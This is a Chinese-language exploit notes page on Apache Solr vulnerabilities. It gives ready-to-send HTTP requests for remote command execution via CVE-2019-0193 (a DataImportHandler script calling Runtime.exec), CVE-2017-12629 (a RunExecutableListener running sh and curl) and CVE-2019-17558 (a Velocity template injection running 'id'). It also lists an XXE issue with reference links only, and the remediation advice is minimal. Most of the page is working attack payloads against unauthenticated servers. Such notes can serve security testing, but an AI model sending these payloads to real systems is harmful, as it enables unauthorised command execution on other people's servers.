---
title: Apache-Solr
---

## 应用简介
Apache Solr 是一个开源的搜索服务器。
Solr 使用 Java 语言开发，主要基于 HTTP 和 Apache Lucene 实现。

## [CVE-2019-0193]-RCE

**漏洞概述**

```http
#影响范围
Solr < 8.2.0
```

此次漏洞出现在Apache Solr的DataImportHandler，该模块是一个可选但常用的模块，用于从数据库和其他源中提取数据。

它具有一个功能，其中所有的DIH配置都可以通过外部请求的dataConfig参数来设置。

由于DIH配置可以包含脚本，因此攻击者可以通过构造危险的请求，从而造成远程命令执行

**漏洞利用**

1、访问`http://ip:8983/`Apache solr的管理页面，无需登录（默认未开启鉴权认证）

```http
POST /solr/tika/dataimport HTTP/1.1
Host: solr.com:8983
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://solr.com:8983/solr/
Content-type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Content-Length: 585
Connection: close

command=full-import&verbose=false&clean=false&commit=false&debug=true&core=tika&name=dataimport&dataConfig=
<dataConfig>
  <dataSource type="URLDataSource"/>
  <script><![CDATA[
          function poc(){ java.lang.Runtime.getRuntime().exec("echo '666' > ./666.txt");
          }
  ]]></script>
  <document>
    <entity name="stackoverflow"
            url="https://stackoverflow.com/feeds/tag/solr"
            processor="XPathEntityProcessor"
            forEach="/feed"
            transformer="script:poc" />
  </document>
</dataConfig>
```

**漏洞分析**

https://xz.aliyun.com/t/5965#toc-6

## [CVE-2017-12629]-RCE

**漏洞概述**

```http
#影响范围
Solr < 7.1.0
```



**漏洞利用**

1、访问`http://ip:8983/`Apache solr的管理页面，无需登录（默认未开启鉴权认证）

2、首先创建一个listener，其中设置exe的值为我们想执行的命令，args的值是命令参数

```http
POST /solr/demo/config HTTP/1.1
Host: your-ip
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Length: 158

{"add-listener":{"event":"postCommit","name":"newlistener","class":"solr.RunExecutableListener","exe":"sh","dir":"/bin/","args":["-c", "touch /tmp/success"]}}
```

3、然后进行update操作，触发刚才添加的listener

```http
POST /solr/demo/update HTTP/1.1
Host: your-ip
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/json
Content-Length: 15

[{"id":"test"}]
```

第二种：直接触发RCE

```http
POST /solr/newcollection/config HTTP/1.1
Host: localhost:8983
Connection: close
Content-Type: application/json  
Content-Length: 198

{
  "add-listener" : {
    "event":"newSearcher",
    "name":"newlistener-1",
    "class":"solr.RunExecutableListener",
    "exe":"curl",
    "dir":"/usr/bin/",
    "args":["http://127.0.0.1:8080"]
  }
}
```

## [CVE-2018-8026]-XXE

**漏洞概述**

```http
#影响范围
6.6.4
7.3.1
```

该XXE漏洞依赖于SolrCloud API，影响到SolrCloud分布式系统。而SolrCloud需要用到zookeeper

**漏洞利用**

参考下边漏洞分析链接中的漏洞复现部分

**修复建议**

升级补丁

**漏洞分析**

https://xz.aliyun.com/t/2448#toc-7

## [CVE-2019-17558]-模板注入

**漏洞概述**

```http
#影响范围
5.0.0 ~ 8.3.1版本
```

攻击者通过未授权访问solr服务器，可以注入自定义模板，通过Velocity模板语言执行任意命令

发送特定的数据包开启 `params.resource.loader.enabled`，然后get访问接口执行命令

**漏洞利用**

1、默认情况下`params.resource.loader.enabled`配置未打开，无法使用自定义模板

我们先通过如下API获取所有的核心：

```http
http://your-ip:8983/solr/admin/cores?indexInfo=false&wt=json
```

2、通过如下请求开启`params.resource.loader.enabled`，其中API路径包含刚才获取的core名称

```http
POST /solr/demo/config HTTP/1.1
Host: solr:8983
Content-Type: application/json
Content-Length: 259

{
  "update-queryresponsewriter": {
    "startup": "lazy",
    "name": "velocity",
    "class": "solr.VelocityResponseWriter",
    "template.base.dir": "",
    "solr.resource.loader.enabled": "true",
    "params.resource.loader.enabled": "true"
  }
}
```

3、之后，注入Velocity模板即可执行任意命令

```http
http://your-ip:8983/solr/demo/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end
```

**修复建议**

设置鉴权（暂时修复）

**漏洞分析**

https://xz.aliyun.com/t/6700#toc-4